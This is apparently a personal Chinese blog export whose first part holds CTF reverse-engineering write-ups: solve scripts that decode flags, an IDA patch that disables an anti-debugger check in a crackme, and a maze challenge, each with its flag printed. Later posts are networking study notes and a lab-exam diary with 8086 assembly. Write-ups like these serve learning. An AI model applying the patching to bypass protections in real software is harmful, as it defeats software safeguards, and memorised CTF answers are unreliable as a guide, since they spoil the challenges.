t: c+=xprint(c) #include &lt;stdio.h&gt; //c语言#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;#pragma warning(disable:4996)int main(void)&#123; char v3; __int64 v5; char s[] = \"c61b68366edeb7bdce3c6820314b7498\"; char t[] = \"SharifCTF&#123;????????????????????????????????&#125;\"; v5 = 0; while (v5 &lt; strlen(s)) &#123; if (v5 &amp; 1) v3 = 1; else v3 = -1; *(t + v5 + 10) = s[v5] + v3; v5++; &#125; printf(\"%s\", t); system(\"PAUSE\"); return 0;&#125; #include&lt;iostream&gt; //c++using namespace std;int main()&#123; char s[34]=&#123;\"c61b68366edeb7bdce3c6820314b7498\"&#125;; char content[34]; int a; for(int i=0;i&lt;33;i++) &#123; if(i&amp;1) a=1; else a=-1; content[i]=s[i]+a; &#125; cout&lt;&lt;content; return 0;&#125; 0x03 re1非常简单入门的逆向题 直接拖入Winhex 搜索字符串CTF 就得到flag了 0x04 no-strings-attached这块的知识点还不咋会，先不写，等我学会了再来写吧 0x05 csaw2013reversing2不多逼逼，直接使用 IDA Pro 7.0 (32 bit) 打开程序，默认进入主函数的反汇编窗口，按下 F5 后进行反编译，自动生成类 C 语言的伪代码： 可已见到，若 sub_40102A() 或 IsDebuggerPresent() 的返回值为真，则执行调试断点指令 __debugbreak()、子函数 sub_401000(v3 + 4, lpMem)、结果进程函数 ExitProcess(0xFFFFFFFF)，否则直接执行 MessageBoxA(0, lpMem + 1, &quot;Flag&quot;, 2u)，弹出全是乱码的 Flag 提示框。 双击 sub_40102A() 查看其反编译代码，发现返回值恒为零： int sub_40102A()&#123; char v0; // t1 v0 = *(_BYTE *)(*(_DWORD *)(__readfsdword(0x18u) + 48) + 2); return 0;&#125; 而对于库函数 IsDebuggerPresent()，若程序处于调试模式下，则返回值为非零；若未处于调试模式下，则返回值为零。显然，程序不处于调试模式下，即无法满足 if 语句的条件。 双击 sub_401000() 查看其反编译代码，目测是对以上乱码数据的解密函数： 综上，解题思路大致为：进入 if 语句块，跳过调试断点，并执行解密函数，最终弹框输出 Flag。 在主函数的反汇编窗口中，核心的语句块如下： 首先，int 3 中断即为调试断点指令，需将其改为空指令 nop。 将光标置于中断指令所在行，依次点击 Edit -&gt; Patch program -&gt; Assemble，弹出指令修改框： 将 int 3 改为 nop 后点击 OK 即可。 小贴士：点击 OK 后，IDA 会自动弹出下一条指令的修改框，通常无需修改，点击 Cancel 即可。 根据上述操作，依次将 jmp short loc_4010EF 修改为 jmp short loc_4010B9，将 jz short loc_4010B9 修改为 jmp short loc_401096，修改完运行流程如下 最后，依次点击 Edit -&gt; Patch program -&gt; Apply patches to input file…，弹出设置框，选择待打补丁程序，按需选择对原程序进行备份，设置完毕后点击 OK 即可。找到修改后的程序，双击执行可获得 flag{reversing_is_not_that_hard!} 0x06 maze这道题之前用IDA打开过，但是整来整去连源码都没找出来，也不知道和迷宫有什么关系。直到上次安恒6月赛题也出了一道类似的迷宫题我才恍然大悟！还是要多做题，兄弟们，没经验基础真滴是不行的。 这是个64位的elf文件，放IDA里看一下main函数，部分代码加了注释 __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; const char *v3; // rsi signed __int64 v4; // rbx signed int v5; // eax char v6; // bp char v7; // al const char *v8; // rdi __int64 v10; // [rsp+0h] [rbp-28h] v10 = 0LL; puts(\"Input flag:\"); scanf(\"%s\", &amp;s1, 0LL); //限制获取输入字符串长度为24且必须开头5个字符为\"nctf&#123;\" 最后一个字符位\"&#125;\" if ( strlen(&amp;s1) != 24 || (v3 = \"nctf&#123;\", strncmp(&amp;s1, \"nctf&#123;\", 5uLL)) || *(&amp;byte_6010BF + 24) != 125 ) &#123;LABEL_22: puts(\"Wrong flag!\"); exit(-1); &#125; v4 = 5LL; if ( strlen(&amp;s1) - 1 &gt; 5 ) &#123; while ( 1 ) &#123; v5 = *(&amp;s1 + v4); v6 = 0; if ( v5 &gt; 78 ) &#123; v5 = (unsigned __int8)v5; if ( (unsigned __int8)v5 == 'O' ) //往左走 &#123; v7 = sub_400650((_DWORD *)&amp;v10 + 1); goto LABEL_14; &#125; if ( v5 == 'o' ) //往右走 &#123; v7 = sub_400660((char *)&amp;v10 + 4, v3); goto LABEL_14; &#125; &#125; else &#123; v5 = (unsigned __int8)v5; if ( (unsigned __int8)v5 == '.' ) //往上走 &#123; v7 = sub_400670(&amp;v10, v3); goto LABEL_14; &#125; if ( v5 == '0' ) //往下走 &#123; v7 = sub_400680(&amp;v10, v3);LABEL_14: v6 = v7; goto LABEL_15; &#125; &#125;LABEL_15: v3 = (const char *)HIDWORD(v10); if ( !(unsigned __int8)sub_400690((__int64)asc_601060, SHIDWORD(v10), v10) ) goto LABEL_22; if ( ++v4 &gt;= strlen(&amp;s1) - 1 ) &#123; if ( v6 ) break;LABEL_20: v8 = \"Wrong flag!\"; goto LABEL_21; &#125; &#125; &#125; if ( asc_601060[8 * (signed int)v10 + SHIDWORD(v10)] != 35 ) goto LABEL_20; v8 = \"Congratulations!\";LABEL_21: puts(v8); return 0LL;&#125; 下边全是goto语句 我们直接将视图切为图表（Graph view） 按r可以发现，根据这四个字符”.“ ,”0“,”o“ , “O“分别跳到不同的位置进行操作 ，既然sub_400650，sub_400660，sub_400670，sub_400680分别是写左右上下的函数，那我们就看看sub_400690到底是干啥的呢！ 我们可以看到sub_400690是和asc_601060有关,猜测是判断上面asc_601060数组的第edi个值是否等于20h或23h，如果不等于就跳到 loc_400822输出wrong flag! 我们直接去Hex中找到地址为601060中的数据！发现恰好为一个八阶方阵，而且数值只有3个，分别为20h，2Ah以及23h 那么函数400690的意思不就是判断当前的位置是否是从（0，0）走到（4，4） 最初的四个跳转应该就是对应着上下左右四个方向 20 20 2A 2A 2A 2A 2A 2A 2A 20 20 20 2A 20 20 2A 2A 2A 2A 20 2A 20 2A 2A 2A 2A 20 20 2A 20 2A 2A 2A 20 20 2A 23 20 20 2A 2A 2A 20 2A 2A 2A 20 2A 2A 2A 20 20 20 20 20 2A 2A 2A 2A 2A 2A 2A 2A 2A 那么上下左右分别对应字符”.” “0” “O” “o” 路径为：右下右右下下左下下下右右右右上上左左 o0oo00O000oooo..OO 我们得到flag为nctf{o0oo00O000oooo..OO}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"Computer Networks","slug":"计算机网络复习总结","date":"2020-07-13T16:52:54.310Z","updated":"2020-07-20T07:01:07.498Z","comments":true,"path":"2020/07/14/计算机网络复习总结/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/07/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"计算机网络复习总结","text":"计算机网络复习总结 0x01 前言本学期最后一科概率论终于考完了 终于闲下来写写自己的博客了。就是闲着太无聊了，计网都考完一周了，我还在这里写总结。不知道明年会不会有学弟学妹来看看我这菜鸡的博客。话不多说，直奔主题！ 0x02 CH1-概论网络协议(network protocol)，简称协议是为进行网络中的数据交换而建立的规则、标准或约定。 • 规定–所交换的数据的格式、有关的同步问题 （1）语法：即数据与控制信息的结构或格式。 （2）语义：即需要发出何种控制信息，完成何种动作以及做出何种响应。 （3）同步：即事件实现顺序的详细说明。 计算机网络定义：计算机网络主要事由一些通用的可编程的硬件互连而成，而这些硬件并非专门用来实现某一特定目的。这些可编程的硬件能够用来传送多种不同类型的数据，并能支持广泛的和日益增长的应用。 时延： 发送时延 传播时延 处理时延 排队时延 拓朴结构：边缘部分：由各主机构成，用户直接进行信息处理和信息共享;低速连入核心网。 ​ 核心部分：由各路由器连网，负责为边缘部分提供高速远程分组交换。 分组交换：先把较长的报文划分成较短的、固定长度的数据段，每一个数据段前面添加上首部构成分组（首部包含地址信息，分组信息等控制信息。 • 中间结点根据首部的地址信息查表转发。 • 每个中间结点都完成存储转发，分组就能 到达目的节点。） 实现设备–路由器(Router) ➢封装发送数据 ➢动态选择传输路径 ➢进行差错校验 ➢可以进行速率转换。 路由器处理分组的过程 – 存储分组 – 查找路由表 – 转发分组 （独立） 分组交换缺点：➢开销-封装首部➢排队延迟 ➢丢包 ➢开销-解封装 ➢乱序 优点：•迅速-不用建立连接 ​ •灵活-分组 ​ •高效-动态分配带宽，逐段占用 ​ •灵活-独立查找发送 ​ •可靠-协议保障 综合 OSI 和 TCP/IP 的优点，采用一种原理体系结构。 各层的主要功能：物理层：物理层的任务就是 透明地传送比特流。物理层还要确定连接电缆插头的定义及连接法。 ​ 数据链路层：数据链路层的任务是在两个相邻结点间的线路上无差错地传送以帧（frame）为单位的数据。每一帧包括 数据和必要的控制信息。 ​ 网络层：网络层的任务就是要选择合适的路由，使发送站的运输层所传下来的分组能够正确无误地按照地址找到目的站，并交付给目的站的运输层。 ​ 运输层：运输层的任务是向上一层的进行通信的两个进程之间提供一个可靠的端到端服务，使它们看不见运输层以下的数据通信的细节。 ​ 应用层：应用层直接为用户的应用进程提供服务。 0x03 CH2-物理层编码：曼彻斯特编码：位周期中心的向上跳变代表0 ​ 差分曼彻斯特编码：在每一位的中心处都有跳变 位开始边界又跳变代表0 ​ 归零制 ​ 不归零制 奈奎斯特(Nyquist) 定理 – W为信道的带宽（以Hz为单位） – L 为信号的离散等级 C=2× W ×log2L 香农(Shannon)定理 – W为信道的带宽（以 Hz 为单位） – S 为信道内所传信号的平均功率 – N 为信道内部的高斯噪声功率 • C = W log2 (1+S/N) b/s • 信噪比单位：分贝dB=10log10 (S/N ) • 信噪比越大，信息的极限传输速率就越高 • 存在无差错的传输 复用是通信技术中的基本概念，是一种干线技术 频分复用FDM：用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。• 频分复用的所有用户在同样的时间占用不同的带宽资源。波分复用就是光的频分复用 时分复用TDM(Time Division Multiplexing) • 时分复用帧（TDM 帧）• 周期性地出现 •本质：所有用户是在不同的时间占用同样的频带宽度。 码分复用：各用户使用经过特殊挑选的相互正交的不同码型，因此彼此不会造成干扰。这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。占用较大的带宽。 0x04 CH3-链路层封装成帧 –封装首部尾部 –界定帧的开始和结束 • 透明传输 –解决帧界定符的传输问题 • 差错控制 –检错纠错 帧定界是分组交换的必然要求透明传输避免消息符号与帧定界符号相混淆差错检测防止合差错的无效数据帧浪费后续路由上的传输和处理资源 封装成帧：首部和尾部的作用实现协议功能 •如何让接收方明确帧的界限？ 要进行帧定界，需要指出帧开始和帧结束。 透明传输：解决界定符的正常传输 出现了“EOT” 误认为是一个帧 发送端的处理 •从网络层获得数据 •在数据中出现的界定符前面插入一个转义字符“ESC” •转义字符出现数据中，在转义字符前面插入一个转义字符。 接收端的处理 •收到比特流，先根据界定符成帧 •删除帧中插入的转义字符；删除连续两个转义字符前面一个 •数据送往网络层 差错控制：在传输过程中可能会产生比特差错 •误码率 BER (Bit Error Rate):在一段时间内，传输错误的比特占所传输比特总数的比率。 •为了保证数据传输的可靠性，必须采用差错控制措施。 •循环冗余检验 CRC 检错技术 •假设待传送的一组数据 M 在 M 的后面再添加供差错检测用的 n 位冗余码一起发送 仅用CRC 只能做到无差错接受 •凡是接受的帧都能以几近于1的概率认为这些帧在传输过程中没有产生差错。 以太网MAC 帧格式：目的地址字段 6 字节，源地址字段 6 字节，类型/长度字段 2 字节（如果小于等于 1536(0x600)，则是数据长度字段（802.3），如果大于 1536，则表示类型（DIX以太网），用来标志 上一层使用的是什么协议， 以便把收到的 MAC 帧的数据上交给上一层的这个协议。），数据字段的最小长度：46字节，FCS 字段 4 字节 无效的 MAC 帧：帧的长度不是整数个字节； •校验有差错； •MAC 帧长小于64字节或大于1518 字节。 对于检查出的无效 MAC 帧——–丢弃 0x05 CH4-网络层TCP/IP 体系中两个主要的协议之一。 •与IP协议配套使用的还有三个协议： – 地址解析协议 ARP – 网际控制报文协议 ICMP – 网际组管理协议 IGMP IP 协议：实现网络互连。使参与互连的性能各异的网络从用户看起来好像是一个统一的网络。网际协议 IP 是 TCP/IP 体系中两个最主要的协议之一，与 IP 协议配套使用的还有四个协议。 ARP 协议：是解决同一个局域网上的主机或路由器的 IP 地址和硬件地址的映射问题。 RARP：是解决同一个局域网上的主机或路由器的硬件地址和 IP 地址的映射问题。 ICMP：提供差错报告和询问报文，以提高 IP 数据交付成功的机会 因特网组管理协议 IGMP：用于探寻、转发本局域网内的组成员关系。 ARP:已经知道了一个机器（主机或路由器）的IP地址，需要找出其相应的硬件地址。 数据链路层的帧必须使用硬件地址。 •每一个主机都有一个 ARP 高速缓存(ARP cache) – 映射表–存放局域网上的各主机、路由器的 IP 地址和 硬件地址。 – 减少网络上的通信量 •主机 A 向本网的主机 B 发送 IP 数据报 根据IP地址查找 ARP 高速缓存 – 如有，将硬件地址写入 MAC 帧。 – 如没有，ARP请求广播。 为什么不用硬件地址直接进行通信？ • 不同协议硬件地址不同 • 硬件地址表异常庞大 • 硬件地址与逻辑网络无关 • 调用 ARP对用户是透明的。连接到因特网的主机 都拥有统一的 IP 地址，它们之间的通信就像连接 在同一个网络上那样简单方便。 为什么划分子网：两级的 IP 地址不够灵活。 ​ – IP 地址空间的利用率有时很低。 ​ – 路由表太大，网络性能差 过程：从其他网络发送给本单位某个主机的 IP 数据报 – 仍然根据 IP 数据报的目的网络号 net-id，先找到连接 在本单位网络上的路由器。 – 单位网路由器收到后，再按目的网络号 net-id 和子网 号 subnet-id 找到目的子网。 – 最后将 IP 数据报直接交付目的主机。 RIP 是内部网关协议中最先得到广泛使用的协议。 • RIP 协议完成网络中的每一个路由器都维护从它自己到每一个目的网络的距离记录。 • RIP 是一种分布式的基于距离向量的路由选择协议。 RIP特点：仅和相邻路由器交换信息。 • 交换的信息是当前本路由器所知道的全部信息， 即自己的路由表。 • 按固定的时间间隔交换路由信息，例如，每隔 30 秒。 RIP工作原理：路由器刚开始工作时，只知道到直接连接的网络的距离（此距离定义为1）。 • 以后，每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。 • 经过若干次更新后，所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下 一跳路由器的地址。 • RIP 协议的收敛(convergence)过程较快，即在自治系统中所有的结点都得到正确的路由选择信息的过程。 RIP协议让AS中的所有路由器都和自己的相邻路由器不断交换路由信息，并不断更新其路由表， 使得从每一个路由器到每一个目的网络的路由都是最短的 优点 • 通用 • 实现简单 • 开销较小 • 易于维护 缺点 • 占用带宽资源 • 网络规模受限 • 收敛时间较长 • 路由度量单一 RIP允许一条路径最多只能包含15 个路由器。因此当距离为16时相当于网络不可达。 • 可见RIP只适用于小型互联网。 • RIP 认为一个好的路由就是它通过的路由器的数 目少，即“距离短” 。 • RIP不能在两个网络之间同时使用多条路由。RIP选择一个具有最少路由器的路由（即最短路由）， 哪怕还存在另一条高速(低时延)但路 由器较多的 路由。 OSPF最主要的特征：是分布式的链路状态协议 OSPF三个要点（工作原理）：• 向本自治系统中所有路由器发送信息，这里使用 的方法是洪泛法。 • 发送的信息就是与本路由器相邻的所有路由器的 链路状态，但这只是路由器所知道的部分信息。 – “链路状态”就是说明本路由器都和哪些路由器相邻， 以及该链路的“度量”(metric)。 • 只有当链路状态发生变化时，路由器才用洪泛法 向所有路由器发送此信息。 OSPF特点：OSPF 不用 UDP 而是直接用 IP 数据报传送。 • OSPF 构成的数据报很短，好处包括 – 减少路由信息通信量。 – 可以不必将长的数据报分片传送。分片传送的数据报只要丢失一个，就无法组装成原来的数据报，而整个数据报就必须重传。 负载平衡如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。 • 支持可变长度的子网划分和无分类编址 CIDR。 • 每一个链路状态都带上一个32位的序号，序号越大状态就越新。 OSPF 的五种分组: 1.问候(Hello)分组：用来发现和维持邻站的可达性 2.数据库描述(Database Description)分组：向邻站给出自己的链路状态数据库中的所以链路状态项目的摘要信息 3.链路状态请求(Link State Request)分组：向对方请求发送某些链路状态项目的详细信息 4.链路状态更新(Link State Update)分组：用洪泛法对全网更新链路状态 5.链路状态确认(Link State Acknowledgment)分组：对链路更新分组的确认。 “转发”(forwarding)就是路由器根据转发表将用户的 IP 数据报从合适的端口转发出去。 • “路由选择”(routing)则是按照分布式算法，根据从各相邻路由器得到的关于网络拓扑的变化情况，动态地改变所选择的路由。 输入：数据链路层剥去帧首部和尾部后，将分组送到网络层的队列中排队等待处理。这会产生一定的时延。 输出：将交换结构传送来的分组发送到线路 • 当交换结构传送过来的分组先进行缓存。数据链路层处理模块将分组加上链路层的首部和尾部，交给物理层后发送到外部线路。 分组丢弃：若路由器处理分组的速率赶不上分组进入队列的 速率，则队列的存储空间最终必定减少到零，这就使后面再进入队列的分组由于没有存储空间而 只能被丢弃。 • 路由器中的输入或输出队列产生溢出是造成分组 丢失的重要原因。 0x06 CH5-运输层TCP 面向连接的服务 – TCP要提供可靠的、面向连接的运输服务 – 增加了许多的开销。协议数据单元的首部大，还要占用许多的处理机资源。 – TCP不提供广播或多播服务。 TCP 传送的数据单位协议是 TCP 报文段 TCP 最主要的特点 • TCP 是面向连接的 • 每一条 TCP 连接只能有两个端点 只能是点对点（一对一）。 • TCP 提供可靠交付的服务 无差错，不丢失，不重复，按序到达。 • TCP 提供全双工通信 • TCP 是面向字节流的。 TCP报文段首部格式：源端口和目的端口字段——各占 2 字节。 端口用于识别应用层进程。运输层的复用和分用功能 都要通过端口才能实现。 序号字段——占 4 字节。TCP 连接中传送的数据流中的每一个字节都编上一个序号。序号字段的值则指的是本报文段所发送的数据的第一个字节的序号 确认号字段——占 4 字节，是期望收到对方的下一个报文段的数据的第一个字节的序号。 数据偏移（即首部长度）——占 4 位，它指出 TCP 报文 段的首部长度。“数据偏移”以 4 字节为计算单位。即首部最大值为60字节。 保留字段——占 6 位，保留为今后使用，但目前 应置为 0。 紧急URG = 1 时，表明紧急指针字 段有效。它告诉系统此报文段中有紧急数据应尽快传送 确认 ACK —— 只有当 ACK = 1 时确认号字段才有效 推送 PSH (PuSH) —— 接收 TCP 收到 PSH = 1 的报文段，就尽快地交付接收应用进程，而不再等到整个 缓存都填满了后再向上交付 复位 RST (ReSeT) —— 当 RST = 1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。 同步 SYN SYN = 1 表示这是一个连接请求或连接接受报文 终止 FIN (FINis) —— 用来释放一个连接。 FIN = 1 表明此报文段的发送端的数据已发送完毕， 并要求释放运输连接。 窗口字段 —— 占 2 字节，用来让对方设置发送窗口的 依据，单位为字节。 检验和 —— 占 2 字节。检验和字段检验的范围包括 首部和数据这两部分。在计算检验和时，要在 TCP 报文段的前面加上12 字节 的伪首部。 紧急指针字段 —— 占 16 位，在URG=1才有意义。 指出在本报文段中紧急数据共有多少个字节（紧急数据放在本报文段数据的最前面）。 即使窗口值为0也可发送紧急数据。 选项字段 —— 长度可变。TCP 最初只规定了一种选 项，即最大报文段长度 MSS 填充字段 —— 这是为了使整个首部长度是 4 字节的 整数倍。 发送缓存用来暂存： – 应用程序传送给 TCP 准备发送的数据； – TCP 已发送出但尚未收到确认的数据。 接收缓存用来暂存： – 按序到达的、但尚未送达上层应用程序的数据； – 不按序到达的数据。 最大数据率=最大窗口*8/平均往返时间 发送时延=数据长度（8比特）/信道带宽 总时延 = 发送时延 + 传播往返时延 每秒窗口=1/总时延 RTTS = (1 − a) ´ (旧的 RTTS ) + a ´ (新的 RTT 样本) RTO = RTTS + 4 ´ RTTD RTTD = (1 − b) ´ (旧的RTTD ) + b ´ ½RTTS − 新的 RTT 样本½ • 运输连接就有三个阶段，即：连接建立、 数据传送和连接释放。 连接建立过程中要解决以下三个问题： – 要使每一方能够确知对方的存在。 – 要允许双方协商一些参数（如最大报文段长度， 最大窗口大小，服务质量等）。 – 能够对运输实体资源（如缓存大小，连接表中 的项目等）进行分配。 连接建立：A 的 TCP 向 B 发出连接请求报文段，其首部中的 同步位 SYN = 1，并选择序号 seq = x，表明传送数据时的第一个数据字节的序号是 x。 B 的 TCP 收到连接请求报文段后，如同意，则发回确认。 • B 在确认报文段中应使 SYN = 1，使 ACK = 1， 其确认号ack = x + 1，自己选择的序号 seq = y。 A 收到此报文段后向 B 给出确认，其 ACK = 1， 确认号 ack = y + 1。 • A 的 TCP 通知上层应用进程，连接已经建立。 B 的 TCP 收到主机 A 的确认后，也通知其上层 应用进程：TCP 连接已经建立。 连接释放:A 把连接释放报文段首部的 FIN = 1，其序号 seq = u，等待 B 的确认 B 发出确认，确认号 ack = u + 1， 而这个报文段自己的序号 seq = v。 • TCP 服务器进程通知高层应用进程。 • 从 A 到 B 这个方向的连接就释放了，TCP 连接 处于半关闭状态。B 若发送数据，A 仍要接收。若 B 已经没有要向 A 发送的数据， 其应用进程就通知 TCP 释放连接。FIN = 1 ACK = 1 seq =w ack = u + 1 A 收到连接释放报文段后，必须发出确认。 在确认报文段中 ACK = 1，确认号 ack = w + 1， 自己的序号 seq = u + 1。 A 必须等待 2MSL 的时间 • 一，为了保证 A 发送的最后一个 ACK 报文 段能够到达 B。 • 二，防止 “已失效的连接请求报文段”出 现在本连接中。 0x07 CH6-应用层域名–具有一定意义的好记的名称，用来标识互联网上的服务器或网站 域名系统DNS的作用：把域名地址解析为IP地址 三级域名 . 二级域名 . 顶级域名 域名解析过程 : 1. 本地域名服务器采用迭代查询 ​ 2.本地域名服务器采用递归查询 递归查询是域名服务器将代替提出请求的客户机（下级DNS服务器）进行域名查询，若域名服务器不能直接回答，则域名服务器会在域各树中的各分支的上下进行递归查询，最终将返回查询结果给客户机。迭代查询是能够使其他服务器返回一个最佳的查询点提示或主机地址，若此最佳的查询点中包含需要查询的主机地址，则返回主机 地址信息，若此时服务器不能够直接查询到主机地址，则是按照提示的指引依次查询。 高速缓存:减轻根域名服务器的负荷，减少网络DNS 查询请求和回答报文的数量。 FTP 使用客户服务器方式。一个 FTP 服务器进程可同时为多个客户进程提供服务。 FTP的服务器进程由两大部分组成：一个主进程，负责接受新的请求；另外有若干个从属进程，负责处理单个请求。 FTP工作过程： • 打开熟知端口（端口号为 21），使客户进程能够 连接上。 • 等待客户进程发出连接请求。 • 启动从属进程来处理客户进程发来的请求。从属 进程对客户进程的请求处理完毕后即终止，但从 属进程在运行期间根据需要还可能创建其他一些 子进程。 • 回到等待状态，继续接受其他客户进程发来的请 求。主进程与从属进程的处理是并发地进行。 控制连接:在整个会话期间一直保持打开，FTP 客 户发出的传送请求通过控制连接发送给服务器端 的控制进程，但控制连接不用来传送文件。 • 用于传输文件的是“数据连接” 。服务器端的控 制进程在接收到 FTP 客户发送来的文件传输请求 后就创建“数据传送进程”和“数据连接” ，用 来连接客户端和服务器端的数据传送进程。 TFTP 是一个很小且易于实现的文件传送协 议。 • TFTP 使用客户服务器方式 • TFTP 使用 UDP 数据报， TFTP 的工作类 似停止等待协议。 • TFTP 只支持文件传输而不支持交互。 • TFTP 没有一个庞大的命令集，没有列目录 的功能，也不能对用户进行身份鉴别。 HTTP工作过程1.建立 TCP 连接 2.HTTP请求报文3. HTTP 响应报文4. 释放 TCP 连接 HTTP 是面向事务的客户服务器协议。 • HTTP 1.0 协议是无状态的(stateless)。 • HTTP 协议本身也是无连接的，虽然它使用了面向连接的TCP向上提供的服务。 HTTP/1.1 协议使用持续连接。 • 万维网服务器在发送响应后仍然在一段时间内保持这条连接，使同一个客户（浏览器）和该服务 器可以继续在这条连接上传送后续的 HTTP 请求报 文和响应报文。 持续连接的两种工作方式 • 非流水线方式：客户在收到前一个响应后才能发出下一个请求。这比非持续连接的两倍 RTT 的开销节省了建立 TCP 连接所需的一个 RTT 时间。但服务器在发送完一个对象后，其 TCP连接就处于空闲状态，浪费了服务器资源。 • 流水线方式：客户在收到HTTP 的响应报文之前就能够接着发送新的请求报文。一个接一个的请求报文到达服务器后，服务器就可连续发回响应报文。使用流水线方式时，客户访问所有的对象只需花费一个 RTT时间，使 TCP 连接 中的空闲时间减少，提高了下载文档效率。 HTTP 有两类报文：请求报文——从客户向服务器发送请求报文。 响应报文——从服务器到客户的回答。 、 请求报文由三个部分组成，即开始行、首部行和实体主体。 在请求报文中，开始行就是请求行。开始行（方法 URL 版本 ） 响应报文的开始行是状态行。 状态行包括三项内容，即 HTTP 的版本，状态码， 以及解释状态码的简单短语。 邮件传送协议：SMTP 所规定的就是在两个相互通信的 SMTP 进程 之间应如何交换信息。 • 由于 SMTP 使用客户服务器方式，因此负责发送 邮件的 SMTP 进程就是 SMTP 客户，而负责接收邮 件的 SMTP 进程就是 SMTP 服务器。 SMTP 通信的三个阶段 1. 连接建立：连接是在发送主机的 SMTP 客户 和接收主机的 SMTP 服务器之间建立的。 SMTP不使用中间的邮件服务器。 2. 邮件传送 3. 连接释放：邮件发送完毕后，SMTP客户应发送QIIT命令，返回信息221，SMTP 释放 TCP 连接。 邮件读取协议：POP也使用客户服务器的工作方式。 • 在接收邮件的用户PC机中必须运行POP客户程序，而在用户所连接的 ISP 的邮件服务器中则运行POP服务器程序。 IMAP 也是按客户服务器方式工作，现在较新的是 版本 4，即 IMAP4。 • 用户在自己的 PC 机上就可以操纵ISP的邮件服务器的邮箱，就像在本地操纵一样。 • 因此 IMAP 是一个联机协议。当用户PC机上的 IMAP 客户程序打开 IMAP 服务器的邮箱时，用户 就可看到邮件的首部。若用户需要打开某个邮件，则该邮件才传到用户的计算机上。 • IMAP最大的好处就是用户可以在不同的地方使用 不同的计算机随时上网阅读和处理自己的邮件。 • IMAP 还允许收件人只读取邮件中的某一个部分。为了节省时间，可以先下载邮件的正文部分，待以后有时间再读取或下载这个很长的附件。 • 缺点是如果用户没有将邮件复制到自己的 PC 上，则邮件一直是存放在 IMAP 服务器上。因此用户需要经常与 IMAP 服务器建立连接。 DHCP(动态主机配置协议)：服务器在数据库查找该计算机配置信息。返回找到信息。找不到从服务器的 IP 地址池中取一个地址分配给该计算机。DHCP服务器的回答报文叫做提供报文","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"现代密码学及其应用笔记","slug":"现代密码学及其应用笔记","date":"2020-06-20T10:20:03.917Z","updated":"2020-06-21T07:34:44.548Z","comments":true,"path":"2020/06/20/现代密码学及其应用笔记/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/06/20/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/","excerpt":"从零开始学密码","text":"从零开始学密码","categories":[{"name":"笔记","slug":"笔记","permalink":"https://github.com/gha01un/gha01un.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://github.com/gha01un/gha01un.github.io/tags/Crypto/"}],"author":"H1un"},{"title":"记一次卑微的微机考试","slug":"记一次卑微的微机考试","date":"2020-06-19T14:21:21.363Z","updated":"2020-06-21T07:39:51.832Z","comments":true,"path":"2020/06/19/记一次卑微的微机考试/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/06/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%91%E5%BE%AE%E7%9A%84%E5%BE%AE%E6%9C%BA%E8%80%83%E8%AF%95/","excerpt":"卑微卑中卑","text":"卑微卑中卑 前言因为周五晚上要考微机实验，这几天一直在从零开始复习微机 本以为自己在考试前把前几次的实验代码搞懂 而且提前还把其他班级考完的题目代码拷到了U盘里就稳稳的了 没想到 现实还是很残酷的 晚上六点半我们进入了实验室 凯爷爷给我们进行了分组，害 我们组没有大佬 只能靠自己了 题目自己的手气还是不错的，抽到的题目也不算太难 题目如下 概述这道题刚看起来我们也没啥思路 读了几遍题目之后，发现和之前那个跑马灯的实验非常相似 大概思路差不多就是利用8253延时1s，8255输出跑马灯形式到发光二极管 然后启动0832延时输出一个锯齿波 最后启动直流电机运转 思路不就是这样嘛 我想老师也不会太抠细节吧 具体细节其实我真的也不太懂 反正就结合别人的代码和书上的代码来呗 于是我们很快就搞出来了程序 程序实现直接上代码 CODE SEGMENTASSUME CS:CODESTART:;8255初始化MOV AL,90H MOV DX,293H ;8255 控制字OUT DX,ALMOV BL,01H ;从第一个灯开始;8253初始化MOV AL,00110101B ;0通道控制字 MOV DX,283H ;8253控制字OUT DX,ALMOV AL,00H ;低八位MOV DX,280H ;写入低八位OUT DX,ALMOV AL,50H ;写入高八位OUT DX,AL;级联 这里要用到两个计数器MOV AL,01110110BMOV DX,283HOUT DX,ALMOV AX,00H ;写入低八位MOV DX,281H ;1通道 写入第二个计数器OUT DX,ALMOV AL,02H ;写入高八位OUT DX,ALMOV BH,00H //这里的BH说实话 我真的不太理解 所以便有了后续MOV CX,07H ;这里是5次循环操作 ;8255,循环 T1:MOV DX,290HIN AL,DXTEST AL,00000001B ;与操作JNZ T2MOV BH,00HJMP T1;运行T2:TEST BH,00000001BJNZ T1INC BH JNZ TESTES:MOV AL,BL ;从右向左移两位MOV DX,291HOUT DX,ALROL BL,2DEC CXJNZ T1;全亮MOV DX,291HMOV AL,11111111B ;小灯最后全亮OUT DX,AL;锯齿波MOV DX,2A0H ;先让程序运行一遍MOV AL,00HOUT DX,ALMOV BL,00HUP:INC BL ;上升T00: ;8253延时MOV DX,290H IN AL,DXTEST AL,01HJNZ T00MOV DX,2A0HMOV AL,BLOUT DX,ALCMP BL,255JNE UPSTO: ;下降MOV AL,00HT11: ;第二次延时 微观延时 MOV 